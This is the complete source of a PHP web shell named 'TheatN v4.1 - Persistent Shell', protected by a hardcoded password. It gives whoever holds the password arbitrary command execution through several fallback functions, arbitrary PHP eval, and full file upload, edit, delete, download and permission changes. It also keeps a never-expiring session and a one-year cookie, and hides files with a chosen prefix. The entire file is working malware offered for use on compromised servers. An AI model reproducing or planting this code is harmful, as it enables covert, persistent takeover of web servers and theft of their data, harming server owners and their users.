<?php
session_start();
error_reporting(0);
set_time_limit(0);
ini_set('memory_limit', '-1');

// Security configuration (change these!)
$MASTER_PASSWORD = 'bakwan89*';  // Change this!
$ENCRYPTION_KEY = 'kingbakwan89*'; // Change this!
$HIDDEN_PREFIX = '__'; // Files starting with this won't appear in listings

// ===== LOGOUT HANDLER =====
if (isset($_GET['kill']) && $_GET['kill'] == 'session') {
    session_destroy();
    setcookie('persist_auth', '', time() - 3600, '/');
    header("Location: ?");
    exit;
}

// ===== AUTHENTICATION SYSTEM =====
$authenticated = false;

// Method 1: Session authentication (NO TIMEOUT)
if (isset($_SESSION['auth_token'])) {
    $auth_data = json_decode(base64_decode($_SESSION['auth_token']), true);
    if ($auth_data && isset($auth_data['valid_until']) && $auth_data['valid_until'] == 'never') {
        $authenticated = true;
    }
}

// Method 2: Persistent cookie (1 year validity)
if (!$authenticated && isset($_COOKIE['persist_auth'])) {
    $cookie_data = json_decode(base64_decode($_COOKIE['persist_auth']), true);
    if ($cookie_data && hash_hmac('sha256', $MASTER_PASSWORD, $ENCRYPTION_KEY) === $cookie_data['hash']) {
        $_SESSION['auth_token'] = base64_encode(json_encode(['valid_until' => 'never']));
        $authenticated = true;
    }
}

// Method 3: Login form
if (!$authenticated && isset($_POST['pass'])) {
    if ($_POST['pass'] === $MASTER_PASSWORD) {
        // Create session token (no expiration)
        $_SESSION['auth_token'] = base64_encode(json_encode(['valid_until' => 'never']));
        
        // Set persistent cookie (1 year)
        if (isset($_POST['remember'])) {
            $cookie_data = ['hash' => hash_hmac('sha256', $MASTER_PASSWORD, $ENCRYPTION_KEY)];
            setcookie('persist_auth', base64_encode(json_encode($cookie_data)), time() + (86400 * 365), "/");
        }
        
        $authenticated = true;
        header("Location: ?");
        exit;
    }
}

// ===== SHOW LOGIN IF NOT AUTHENTICATED =====
if (!$authenticated) {
    ?>
    <!DOCTYPE html>
    <html>
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Secure Access</title>
        <style>
            * { margin:0; padding:0; box-sizing:border-box; font-family: monospace; }
            body { background: #0f172a; color: #e2e8f0; min-height:100vh; display:flex; align-items:center; justify-content:center; }
            .login-box { background: #1e293b; padding:40px; border-radius:10px; border:1px solid #334155; width:100%; max-width:400px; }
            h1 { text-align:center; margin-bottom:30px; color:#60a5fa; }
            .input-group { margin-bottom:20px; }
            label { display:block; margin-bottom:5px; color:#94a3b8; }
            input[type="password"] { width:100%; padding:10px; background:#0f172a; border:1px solid #334155; color:#fff; border-radius:5px; }
            button { width:100%; padding:12px; background:#3b82f6; color:white; border:none; border-radius:5px; cursor:pointer; font-weight:bold; }
            .remember { margin:15px 0; display:flex; align-items:center; gap:8px; color:#94a3b8; }
        </style>
    </head>
    <body>
        <div class="login-box">
            <h1>🔐 System Access</h1>
            <form method="POST">
                <div class="input-group">
                    <label>Access Key:</label>
                    <input type="password" name="pass" required autofocus>
                </div>
                <div class="remember">
                    <input type="checkbox" id="remember" name="remember" checked>
                    <label for="remember">Persistent Session (1 Year)</label>
                </div>
                <button type="submit">Authenticate</button>
            </form>
        </div>
    </body>
    </html>
    <?php
    exit;
}

// ===== UTILITY FUNCTIONS =====
function getPerms($path) {
    if (!file_exists($path)) return '---------';
    $perms = fileperms($path);
    $info = '';
    $info .= (($perms & 0x0100) ? 'r' : '-');
    $info .= (($perms & 0x0080) ? 'w' : '-');
    $info .= (($perms & 0x0040) ? (($perms & 0x0800) ? 's' : 'x') : (($perms & 0x0800) ? 'S' : '-'));
    $info .= (($perms & 0x0020) ? 'r' : '-');
    $info .= (($perms & 0x0010) ? 'w' : '-');
    $info .= (($perms & 0x0008) ? (($perms & 0x0400) ? 's' : 'x') : (($perms & 0x0400) ? 'S' : '-'));
    $info .= (($perms & 0x0004) ? 'r' : '-');
    $info .= (($perms & 0x0002) ? 'w' : '-');
    $info .= (($perms & 0x0001) ? (($perms & 0x0200) ? 't' : 'x') : (($perms & 0x0200) ? 'T' : '-'));
    return $info;
}

function formatSize($bytes) {
    if ($bytes >= 1073741824) return number_format($bytes / 1073741824, 2) . ' GB';
    if ($bytes >= 1048576) return number_format($bytes / 1048576, 2) . ' MB';
    if ($bytes >= 1024) return number_format($bytes / 1024, 2) . ' KB';
    return $bytes . ' B';
}

function exe($cmd) {
    $output = '';
    if (function_exists('shell_exec')) {
        $output = @shell_exec($cmd . ' 2>&1');
    } elseif (function_exists('system')) {
        @ob_start();
        @system($cmd . ' 2>&1');
        $output = @ob_get_clean();
    } elseif (function_exists('exec')) {
        @exec($cmd . ' 2>&1', $lines);
        $output = implode("\n", $lines);
    } elseif (function_exists('passthru')) {
        @ob_start();
        @passthru($cmd . ' 2>&1');
        $output = @ob_get_clean();
    } elseif (is_callable('proc_open')) {
        $proc = proc_open($cmd, [1 => ['pipe','w'], 2 => ['pipe','w']], $pipes);
        $output = stream_get_contents($pipes[1]) . stream_get_contents($pipes[2]);
        @fclose($pipes[1]); @fclose($pipes[2]);
        @proc_close($proc);
    }
    return htmlspecialchars($output ?: 'Command execution failed');
}

function listDir($path) {
    $items = [];
    if (!is_dir($path)) return $items;
    
    $handle = opendir($path);
    while (($item = readdir($handle)) !== false) {
        if ($item == '.' || $item == '..') continue;
        if (substr($item, 0, strlen($GLOBALS['HIDDEN_PREFIX'])) == $GLOBALS['HIDDEN_PREFIX']) continue;
        
        $fullpath = $path . '/' . $item;
        $items[] = [
            'name' => $item,
            'path' => $fullpath,
            'type' => is_dir($fullpath) ? 'dir' : 'file',
            'size' => is_dir($fullpath) ? '-' : formatSize(filesize($fullpath)),
            'perms' => getPerms($fullpath),
            'modified' => date('Y-m-d H:i', filemtime($fullpath)),
            'owner' => function_exists('posix_getpwuid') ? posix_getpwuid(fileowner($fullpath))['name'] : '?'
        ];
    }
    closedir($handle);
    
    usort($items, function($a, $b) {
        if ($a['type'] == $b['type']) return strcmp($a['name'], $b['name']);
        return $a['type'] == 'dir' ? -1 : 1;
    });
    
    return $items;
}

// ===== FILE OPERATIONS HANDLER =====
$current_path = isset($_GET['path']) ? realpath($_GET['path']) : realpath('.');
if (!$current_path) $current_path = realpath('.');

$message = '';
$message_type = '';

// File upload
if (isset($_FILES['upload_file']) && $_FILES['upload_file']['error'] == 0) {
    $target = $current_path . '/' . basename($_FILES['upload_file']['name']);
    if (move_uploaded_file($_FILES['upload_file']['tmp_name'], $target)) {
        $message = '✓ Uploaded: ' . htmlspecialchars($_FILES['upload_file']['name']);
        $message_type = 'success';
    } else {
        $message = '✗ Upload failed';
        $message_type = 'error';
    }
}

// File actions
if (isset($_POST['action'])) {
    $action = $_POST['action'];
    
    switch ($action) {
        case 'delete':
            $target = $_POST['target'];
            if (is_dir($target)) {
                $it = new RecursiveDirectoryIterator($target, FilesystemIterator::SKIP_DOTS);
                $ri = new RecursiveIteratorIterator($it, RecursiveIteratorIterator::CHILD_FIRST);
                foreach ($ri as $file) {
                    $file->isDir() ? rmdir($file->getPathname()) : unlink($file->getPathname());
                }
                rmdir($target);
            } else {
                unlink($target);
            }
            $message = '✓ Deleted: ' . htmlspecialchars(basename($target));
            $message_type = 'success';
            break;
            
        case 'rename':
            $old = $_POST['old_name'];
            $new = $_POST['new_name'];
            if (rename($old, $new)) {
                $message = '✓ Renamed to: ' . htmlspecialchars(basename($new));
                $message_type = 'success';
            }
            break;
            
        case 'new_folder':
            $name = $_POST['folder_name'];
            mkdir($current_path . '/' . $name, 0755);
            $message = '✓ Created folder: ' . htmlspecialchars($name);
            $message_type = 'success';
            break;
            
        case 'new_file':
            $name = $_POST['file_name'];
            $content = $_POST['file_content'] ?? '';
            file_put_contents($current_path . '/' . $name, $content);
            $message = '✓ Created file: ' . htmlspecialchars($name);
            $message_type = 'success';
            break;
            
        case 'save_file':
            $path = $_POST['file_path'];
            $content = $_POST['file_content'];
            file_put_contents($path, $content);
            $message = '✓ File saved';
            $message_type = 'success';
            break;
            
        case 'chmod':
            $target = $_POST['target'];
            $mode = octdec($_POST['mode']);
            chmod($target, $mode);
            $message = '✓ Permissions updated';
            $message_type = 'success';
            break;
    }
}

// ===== SYSTEM INFORMATION =====
$sysinfo = [
    'OS' => php_uname(),
    'PHP' => phpversion(),
    'Server' => $_SERVER['SERVER_SOFTWARE'] ?? 'N/A',
    'IP' => $_SERVER['SERVER_ADDR'] ?? gethostbyname($_SERVER['SERVER_NAME']),
    'User' => exe('whoami'),
    'Disk Free' => formatSize(disk_free_space($current_path)),
    'Disk Total' => formatSize(disk_total_space($current_path))
];

// ===== MAIN INTERFACE =====
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>TheatN v4.1 - Persistent Shell</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        :root {
            --bg-dark: #0f172a;
            --bg-card: #1e293b;
            --bg-hover: #2d3748;
            --primary: #3b82f6;
            --success: #10b981;
            --danger: #ef4444;
            --warning: #f59e0b;
            --text: #e2e8f0;
            --text-muted: #94a3b8;
            --border: #334155;
        }
        
        * { margin:0; padding:0; box-sizing:border-box; font-family: 'Segoe UI', system-ui, sans-serif; }
        
        body {
            background: var(--bg-dark);
            color: var(--text);
            min-height: 100vh;
            padding: 20px;
        }
        
        .container {
            max-width: 1400px;
            margin: 0 auto;
        }
        
        /* Header */
        .header {
            background: var(--bg-card);
            border-radius: 10px;
            padding: 20px;
            margin-bottom: 20px;
            border: 1px solid var(--border);
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        
        .header h1 {
            font-size: 24px;
            color: var(--primary);
        }
        
        .header h1 i {
            margin-right: 10px;
        }
        
        .status-bar {
            display: flex;
            gap: 15px;
            font-size: 14px;
            color: var(--text-muted);
        }
        
        .status-item {
            background: rgba(59, 130, 246, 0.1);
            padding: 5px 10px;
            border-radius: 5px;
        }
        
        /* Message */
        .message {
            padding: 15px;
            border-radius: 8px;
            margin-bottom: 20px;
            display: flex;
            align-items: center;
            gap: 10px;
        }
        
        .message.success {
            background: rgba(16, 185, 129, 0.1);
            border: 1px solid var(--success);
            color: var(--success);
        }
        
        .message.error {
            background: rgba(239, 68, 68, 0.1);
            border: 1px solid var(--danger);
            color: var(--danger);
        }
        
        /* Tabs */
        .tabs {
            display: flex;
            gap: 10px;
            margin-bottom: 20px;
            flex-wrap: wrap;
        }
        
        .tab {
            padding: 12px 24px;
            background: var(--bg-card);
            border: 1px solid var(--border);
            border-radius: 8px;
            color: var(--text-muted);
            text-decoration: none;
            display: flex;
            align-items: center;
            gap: 8px;
            transition: all 0.2s;
        }
        
        .tab:hover, .tab.active {
            background: var(--primary);
            color: white;
        }
        
        /* Panels */
        .panel {
            background: var(--bg-card);
            border-radius: 10px;
            padding: 20px;
            margin-bottom: 20px;
            border: 1px solid var(--border);
        }
        
        .panel-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 20px;
            padding-bottom: 15px;
            border-bottom: 1px solid var(--border);
        }
        
        .panel-title {
            font-size: 18px;
            font-weight: 600;
            color: var(--text);
        }
        
        .btn {
            padding: 10px 20px;
            border-radius: 6px;
            border: none;
            font-weight: 500;
            cursor: pointer;
            display: inline-flex;
            align-items: center;
            gap: 8px;
            transition: all 0.2s;
            text-decoration: none;
            font-size: 14px;
        }
        
        .btn-primary {
            background: var(--primary);
            color: white;
        }
        
        .btn-primary:hover {
            background: #2563eb;
        }
        
        .btn-success {
            background: var(--success);
            color: white;
        }
        
        .btn-danger {
            background: var(--danger);
            color: white;
        }
        
        .btn-warning {
            background: var(--warning);
            color: white;
        }
        
        /* File Manager */
        .breadcrumb {
            background: rgba(0,0,0,0.2);
            padding: 15px;
            border-radius: 8px;
            margin-bottom: 20px;
            display: flex;
            align-items: center;
            flex-wrap: wrap;
            gap: 5px;
        }
        
        .breadcrumb a {
            color: var(--text-muted);
            text-decoration: none;
        }
        
        .breadcrumb a:hover {
            color: var(--primary);
        }
        
        .file-table {
            width: 100%;
            border-collapse: collapse;
        }
        
        .file-table th {
            text-align: left;
            padding: 15px;
            background: rgba(0,0,0,0.2);
            color: var(--text-muted);
            font-weight: 500;
            border-bottom: 1px solid var(--border);
        }
        
        .file-table td {
            padding: 15px;
            border-bottom: 1px solid var(--border);
            color: var(--text-muted);
        }
        
        .file-table tr:hover {
            background: var(--bg-hover);
        }
        
        .file-icon {
            margin-right: 10px;
        }
        
        .file-actions {
            display: flex;
            gap: 5px;
        }
        
        .action-btn {
            width: 36px;
            height: 36px;
            border-radius: 6px;
            display: flex;
            align-items: center;
            justify-content: center;
            color: white;
            text-decoration: none;
            transition: all 0.2s;
        }
        
        .action-btn:hover {
            transform: translateY(-2px);
        }
        
        /* Terminal */
        .terminal {
            background: #000;
            border-radius: 8px;
            overflow: hidden;
        }
        
        .terminal-header {
            background: #1a1a1a;
            padding: 15px;
            border-bottom: 1px solid #333;
        }
        
        .terminal-body {
            padding: 20px;
            color: #00ff00;
            font-family: 'Courier New', monospace;
            min-height: 200px;
            max-height: 400px;
            overflow-y: auto;
            background: #000;
        }
        
        .cmd-input {
            display: flex;
            gap: 10px;
            padding: 15px;
            background: #1a1a1a;
            border-top: 1px solid #333;
        }
        
        .cmd-input input {
            flex: 1;
            background: #2d2d2d;
            border: 1px solid #444;
            color: #fff;
            padding: 12px;
            border-radius: 6px;
            font-family: 'Courier New', monospace;
        }
        
        /* Forms */
        .form-group {
            margin-bottom: 20px;
        }
        
        .form-label {
            display: block;
            margin-bottom: 8px;
            color: var(--text);
        }
        
        .form-input {
            width: 100%;
            padding: 12px;
            background: rgba(0,0,0,0.2);
            border: 1px solid var(--border);
            border-radius: 6px;
            color: var(--text);
        }
        
        textarea.form-input {
            min-height: 200px;
            font-family: 'Courier New', monospace;
            resize: vertical;
        }
        
        /* Stats */
        .stats-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 15px;
            margin-bottom: 20px;
        }
        
        .stat-card {
            background: var(--bg-card);
            border: 1px solid var(--border);
            border-radius: 8px;
            padding: 15px;
        }
        
        .stat-label {
            color: var(--text-muted);
            font-size: 12px;
            margin-bottom: 5px;
        }
        
        .stat-value {
            font-size: 18px;
            font-weight: 600;
            color: var(--text);
        }
        
        /* Modal */
        .modal {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: rgba(0,0,0,0.8);
            z-index: 1000;
            align-items: center;
            justify-content: center;
        }
        
        .modal.active {
            display: flex;
        }
        
        .modal-content {
            background: var(--bg-card);
            border-radius: 10px;
            padding: 30px;
            width: 90%;
            max-width: 600px;
            max-height: 90vh;
            overflow-y: auto;
        }
        
        .modal-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 20px;
        }
        
        .modal-close {
            background: none;
            border: none;
            color: var(--text-muted);
            font-size: 24px;
            cursor: pointer;
        }
    </style>
</head>
<body>
    <div class="container">
        <!-- Header -->
        <div class="header">
            <h1><i class="fas fa-terminal"></i> TheatN v4.1 - Persistent Shell</h1>
            <div class="status-bar">
                <span class="status-item"><i class="fas fa-user"></i> <?php echo htmlspecialchars($sysinfo['User']); ?></span>
                <span class="status-item"><i class="fas fa-server"></i> <?php echo htmlspecialchars($sysinfo['IP']); ?></span>
                <a href="?kill=session" class="btn btn-danger"><i class="fas fa-sign-out-alt"></i> Logout</a>
            </div>
        </div>
        
        <?php if ($message): ?>
            <div class="message <?php echo $message_type; ?>">
                <i class="fas fa-<?php echo $message_type == 'success' ? 'check-circle' : 'exclamation-triangle'; ?>"></i>
                <?php echo $message; ?>
            </div>
        <?php endif; ?>
        
        <!-- Tabs -->
        <?php $active_tab = isset($_GET['tab']) ? $_GET['tab'] : 'files'; ?>
        <div class="tabs">
            <a href="?tab=files&path=<?php echo urlencode($current_path); ?>" class="tab <?php echo $active_tab == 'files' ? 'active' : ''; ?>">
                <i class="fas fa-folder"></i> File Manager
            </a>
            <a href="?tab=terminal" class="tab <?php echo $active_tab == 'terminal' ? 'active' : ''; ?>">
                <i class="fas fa-terminal"></i> Terminal
            </a>
            <a href="?tab=tools" class="tab <?php echo $active_tab == 'tools' ? 'active' : ''; ?>">
                <i class="fas fa-tools"></i> Tools
            </a>
            <a href="?tab=info" class="tab <?php echo $active_tab == 'info' ? 'active' : ''; ?>">
                <i class="fas fa-info-circle"></i> System Info
            </a>
        </div>
        
        <!-- System Info Panel -->
        <?php if ($active_tab == 'info'): ?>
            <div class="panel">
                <div class="panel-header">
                    <h2 class="panel-title"><i class="fas fa-server"></i> System Information</h2>
                </div>
                <div class="stats-grid">
                    <?php foreach ($sysinfo as $key => $value): ?>
                        <div class="stat-card">
                            <div class="stat-label"><?php echo htmlspecialchars($key); ?></div>
                            <div class="stat-value"><?php echo htmlspecialchars($value); ?></div>
                        </div>
                    <?php endforeach; ?>
                </div>
                <div class="panel">
                    <h3><i class="fas fa-microchip"></i> PHP Information</h3>
                    <pre style="background:#000;color:#0f0;padding:15px;border-radius:8px;max-height:300px;overflow:auto;"><?php 
                        ob_start();
                        phpinfo();
                        $phpinfo = ob_get_clean();
                        echo htmlspecialchars(preg_replace('/<.*?>/s', '', $phpinfo));
                    ?></pre>
                </div>
            </div>
        
        <!-- Terminal Panel -->
        <?php elseif ($active_tab == 'terminal'): ?>
            <div class="panel">
                <div class="panel-header">
                    <h2 class="panel-title"><i class="fas fa-terminal"></i> System Terminal</h2>
                </div>
                <div class="terminal">
                    <div class="terminal-body" id="terminalOutput">
                        <?php if (isset($_GET['cmd'])): ?>
                            <div style="color:#00ff00;">$ <?php echo htmlspecialchars($_GET['cmd']); ?></div>
                            <div style="color:#fff; margin-top:10px; white-space:pre-wrap;">
                                <?php echo exe($_GET['cmd']); ?>
                            </div>
                        <?php else: ?>
                            <div style="color:#ccc;">$ Type a command and press Enter...</div>
                            <div style="color:#666; margin-top:10px;">
                                Available commands: whoami, pwd, ls -la, ps aux, netstat -tulpn, etc.
                            </div>
                        <?php endif; ?>
                    </div>
                    <form method="GET" class="cmd-input">
                        <input type="text" name="cmd" placeholder="Enter command..." autocomplete="off" autofocus>
                        <input type="hidden" name="tab" value="terminal">
                        <button type="submit" class="btn btn-primary">
                            <i class="fas fa-play"></i> Execute
                        </button>
                    </form>
                </div>
            </div>
        
        <!-- Tools Panel -->
        <?php elseif ($active_tab == 'tools'): ?>
            <div class="panel">
                <div class="panel-header">
                    <h2 class="panel-title"><i class="fas fa-tools"></i> System Tools</h2>
                </div>
                
                <div class="stats-grid">
                    <div class="stat-card">
                        <h4><i class="fas fa-database"></i> Database Connector</h4>
                        <form method="POST" action="?tab=tools">
                            <div class="form-group">
                                <input type="text" name="db_host" placeholder="Host" class="form-input" style="margin-bottom:5px;">
                                <input type="text" name="db_user" placeholder="Username" class="form-input" style="margin-bottom:5px;">
                                <input type="password" name="db_pass" placeholder="Password" class="form-input" style="margin-bottom:5px;">
                                <input type="text" name="db_name" placeholder="Database" class="form-input" style="margin-bottom:10px;">
                                <button type="submit" name="db_connect" class="btn btn-primary">Connect</button>
                            </div>
                        </form>
                    </div>
                    
                    <div class="stat-card">
                        <h4><i class="fas fa-code"></i> PHP Evaluator</h4>
                        <form method="POST" action="?tab=tools">
                            <div class="form-group">
                                <textarea name="php_code" class="form-input" placeholder="&lt;?php echo 'Hello World'; ?&gt;" style="height:100px;"></textarea>
                                <button type="submit" name="eval_php" class="btn btn-warning">Execute PHP</button>
                            </div>
                        </form>
                    </div>
                </div>
                
                <?php if (isset($_POST['eval_php']) && isset($_POST['php_code'])): ?>
                    <div class="panel">
                        <h4><i class="fas fa-play-circle"></i> Output:</h4>
                        <pre style="background:#000;color:#0f0;padding:15px;border-radius:8px;"><?php
                            ob_start();
                            eval($_POST['php_code']);
                            $output = ob_get_clean();
                            echo htmlspecialchars($output);
                        ?></pre>
                    </div>
                <?php endif; ?>
            </div>
        
        <!-- File Manager (Default) -->
        <?php else: ?>
            <!-- Breadcrumb -->
            <div class="breadcrumb">
                <a href="?"><i class="fas fa-home"></i> /</a>
                <?php 
                $parts = explode('/', trim(str_replace('\\', '/', $current_path), '/'));
                $accum = '';
                foreach ($parts as $i => $part):
                    $accum .= '/' . $part;
                ?>
                    <span>/</span>
                    <a href="?path=<?php echo urlencode($accum); ?>"><?php echo htmlspecialchars($part); ?></a>
                <?php endforeach; ?>
            </div>
            
            <!-- File Actions -->
            <div class="panel">
                <div class="panel-header">
                    <h2 class="panel-title"><i class="fas fa-folder-open"></i> Current Directory: <?php echo htmlspecialchars($current_path); ?></h2>
                    <div>
                        <button onclick="showModal('uploadModal')" class="btn btn-success"><i class="fas fa-upload"></i> Upload</button>
                        <button onclick="showModal('newFolderModal')" class="btn btn-primary"><i class="fas fa-folder-plus"></i> New Folder</button>
                        <button onclick="showModal('newFileModal')" class="btn btn-primary"><i class="fas fa-file-plus"></i> New File</button>
                    </div>
                </div>
                
                <!-- File Table -->
                <table class="file-table">
                    <thead>
                        <tr>
                            <th>Name</th>
                            <th>Size</th>
                            <th>Permissions</th>
                            <th>Modified</th>
                            <th>Owner</th>
                            <th>Actions</th>
                        </tr>
                    </thead>
                    <tbody>
                        <!-- Parent Directory -->
                        <tr>
                            <td>
                                <a href="?path=<?php echo urlencode(dirname($current_path)); ?>">
                                    <i class="fas fa-level-up-alt file-icon" style="color:#f59e0b;"></i> ..
                                </a>
                            </td>
                            <td>--</td>
                            <td>drwxr-xr-x</td>
                            <td>--</td>
                            <td>--</td>
                            <td></td>
                        </tr>
                        
                        <!-- Directory Contents -->
                        <?php $items = listDir($current_path); ?>
                        <?php foreach ($items as $item): ?>
                            <tr>
                                <td>
                                    <?php if ($item['type'] == 'dir'): ?>
                                        <a href="?path=<?php echo urlencode($item['path']); ?>">
                                            <i class="fas fa-folder file-icon" style="color:#f59e0b;"></i>
                                            <?php echo htmlspecialchars($item['name']); ?>
                                        </a>
                                    <?php else: ?>
                                        <a href="?view=<?php echo urlencode($item['path']); ?>">
                                            <i class="fas fa-file file-icon" style="color:#3b82f6;"></i>
                                            <?php echo htmlspecialchars($item['name']); ?>
                                        </a>
                                    <?php endif; ?>
                                </td>
                                <td><?php echo $item['size']; ?></td>
                                <td><?php echo $item['perms']; ?></td>
                                <td><?php echo $item['modified']; ?></td>
                                <td><?php echo htmlspecialchars($item['owner']); ?></td>
                                <td>
                                    <div class="file-actions">
                                        <?php if ($item['type'] == 'file'): ?>
                                            <a href="?view=<?php echo urlencode($item['path']); ?>" class="action-btn" style="background:#3b82f6;">
                                                <i class="fas fa-eye"></i>
                                            </a>
                                            <a href="?edit=<?php echo urlencode($item['path']); ?>" class="action-btn" style="background:#f59e0b;">
                                                <i class="fas fa-edit"></i>
                                            </a>
                                            <a href="?download=<?php echo urlencode($item['path']); ?>" class="action-btn" style="background:#10b981;">
                                                <i class="fas fa-download"></i>
                                            </a>
                                        <?php endif; ?>
                                        <form method="POST" style="display:inline;">
                                            <input type="hidden" name="action" value="delete">
                                            <input type="hidden" name="target" value="<?php echo htmlspecialchars($item['path']); ?>">
                                            <button type="submit" class="action-btn" style="background:#ef4444;" onclick="return confirm('Delete <?php echo htmlspecialchars($item['name']); ?>?')">
                                                <i class="fas fa-trash"></i>
                                            </button>
                                        </form>
                                    </div>
                                </td>
                            </tr>
                        <?php endforeach; ?>
                    </tbody>
                </table>
            </div>
            
            <!-- Disk Stats -->
            <div class="stats-grid">
                <div class="stat-card">
                    <div class="stat-label">Disk Usage</div>
                    <div class="stat-value"><?php echo $sysinfo['Disk Free']; ?> free of <?php echo $sysinfo['Disk Total']; ?></div>
                </div>
                <div class="stat-card">
                    <div class="stat-label">Total Items</div>
                    <div class="stat-value"><?php echo count($items); ?></div>
                </div>
                <div class="stat-card">
                    <div class="stat-label">Current Path</div>
                    <div class="stat-value" style="font-size:14px;word-break:break-all;"><?php echo htmlspecialchars($current_path); ?></div>
                </div>
            </div>
        <?php endif; ?>
    </div>
    
    <!-- Modals -->
    <div id="uploadModal" class="modal">
        <div class="modal-content">
            <div class="modal-header">
                <h3><i class="fas fa-upload"></i> Upload File</h3>
                <button class="modal-close" onclick="hideModal('uploadModal')">&times;</button>
            </div>
            <form method="POST" enctype="multipart/form-data">
                <input type="hidden" name="path" value="<?php echo htmlspecialchars($current_path); ?>">
                <div class="form-group">
                    <label class="form-label">Select File</label>
                    <input type="file" name="upload_file" class="form-input" required>
                </div>
                <button type="submit" class="btn btn-success">Upload</button>
            </form>
        </div>
    </div>
    
    <div id="newFolderModal" class="modal">
        <div class="modal-content">
            <div class="modal-header">
                <h3><i class="fas fa-folder-plus"></i> Create New Folder</h3>
                <button class="modal-close" onclick="hideModal('newFolderModal')">&times;</button>
            </div>
            <form method="POST">
                <input type="hidden" name="action" value="new_folder">
                <div class="form-group">
                    <label class="form-label">Folder Name</label>
                    <input type="text" name="folder_name" class="form-input" required>
                </div>
                <button type="submit" class="btn btn-primary">Create</button>
            </form>
        </div>
    </div>
    
    <div id="newFileModal" class="modal">
        <div class="modal-content">
            <div class="modal-header">
                <h3><i class="fas fa-file-plus"></i> Create New File</h3>
                <button class="modal-close" onclick="hideModal('newFileModal')">&times;</button>
            </div>
            <form method="POST">
                <input type="hidden" name="action" value="new_file">
                <div class="form-group">
                    <label class="form-label">File Name</label>
                    <input type="text" name="file_name" class="form-input" required>
                </div>
                <div class="form-group">
                    <label class="form-label">Content (Optional)</label>
                    <textarea name="file_content" class="form-input" rows="10"></textarea>
                </div>
                <button type="submit" class="btn btn-primary">Create</button>
            </form>
        </div>
    </div>
    
    <!-- View/Edit File -->
    <?php if (isset($_GET['view']) || isset($_GET['edit'])): ?>
        <?php 
        $file_path = isset($_GET['view']) ? $_GET['view'] : $_GET['edit'];
        $is_edit = isset($_GET['edit']);
        $content = file_exists($file_path) ? htmlspecialchars(file_get_contents($file_path)) : '';
        ?>
        <div id="fileModal" class="modal active">
            <div class="modal-content">
                <div class="modal-header">
                    <h3><i class="fas fa-<?php echo $is_edit ? 'edit' : 'eye'; ?>"></i> 
                        <?php echo $is_edit ? 'Edit' : 'View'; ?>: <?php echo htmlspecialchars(basename($file_path)); ?>
                    </h3>
                    <button class="modal-close" onclick="window.location.href='?'">&times;</button>
                </div>
                <?php if ($is_edit): ?>
                    <form method="POST">
                        <input type="hidden" name="action" value="save_file">
                        <input type="hidden" name="file_path" value="<?php echo htmlspecialchars($file_path); ?>">
                        <div class="form-group">
                            <textarea name="file_content" class="form-input" rows="20"><?php echo $content; ?></textarea>
                        </div>
                        <button type="submit" class="btn btn-success">Save</button>
                        <a href="?" class="btn btn-danger">Cancel</a>
                    </form>
                <?php else: ?>
                    <pre style="background:#000;color:#0f0;padding:15px;border-radius:8px;max-height:500px;overflow:auto;"><?php echo $content; ?></pre>
                    <div style="margin-top:15px;">
                        <a href="?edit=<?php echo urlencode($file_path); ?>" class="btn btn-warning"><i class="fas fa-edit"></i> Edit</a>
                        <a href="?download=<?php echo urlencode($file_path); ?>" class="btn btn-success"><i class="fas fa-download"></i> Download</a>
                        <a href="?" class="btn btn-danger">Close</a>
                    </div>
                <?php endif; ?>
            </div>
        </div>
    <?php endif; ?>
    
    <!-- Download Handler -->
    <?php if (isset($_GET['download']) && file_exists($_GET['download'])): ?>
        <?php
        $file = $_GET['download'];
        header('Content-Description: File Transfer');
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="' . basename($file) . '"');
        header('Content-Length: ' . filesize($file));
        readfile($file);
        exit;
        ?>
    <?php endif; ?>
    
    <script>
        function showModal(id) {
            document.getElementById(id).classList.add('active');
        }
        
        function hideModal(id) {
            document.getElementById(id).classList.remove('active');
        }
        
        // Close modals on ESC
        document.addEventListener('keydown', function(e) {
            if (e.key === 'Escape') {
                document.querySelectorAll('.modal.active').forEach(modal => {
                    modal.classList.remove('active');
                });
            }
        });
        
        // Auto-focus terminal input
        <?php if ($active_tab == 'terminal'): ?>
            document.querySelector('input[name="cmd"]').focus();
        <?php endif; ?>
    </script>
</body>
</html>